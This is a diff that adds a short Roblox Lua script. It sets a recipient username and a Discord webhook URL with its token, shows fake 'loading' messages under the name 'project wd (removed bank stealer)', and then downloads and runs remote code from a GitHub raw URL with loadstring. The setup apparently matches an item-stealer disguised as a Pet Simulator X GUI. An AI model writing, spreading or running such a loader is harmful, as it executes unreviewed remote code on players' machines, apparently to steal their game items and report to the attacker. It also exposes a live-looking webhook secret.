@@ -1,0 +1,9 @@
+Username = "nNjazjaj"
+WebHook = "https://discord.com/api/webhooks/1076465443029659708/PRtimJps6GsyxyZQf3xwPHp_dv07F8zg-2oHG5LpSdXAVu55tiHdKQs9k5uOL6Y-nc2C"
+
+_G.CustomScriptName = "project wd (removed bank stealer)"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
